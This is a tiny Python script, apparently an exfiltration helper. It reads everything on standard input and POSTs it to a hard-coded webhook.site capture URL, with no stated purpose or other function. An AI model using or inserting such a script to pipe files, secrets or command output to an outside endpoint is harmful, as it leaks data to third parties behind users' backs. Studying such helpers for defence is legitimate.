import sys
from urllib.request import urlopen
from urllib.parse import urlencode


url = 'https://webhook.site/2e2797f2-598a-4126-b270-9bbcb4837210'


line = sys.stdin.read()

data = {
    'data': line
}

post_data = urlencode(data).encode('ascii')

r = urlopen(url, post_data)
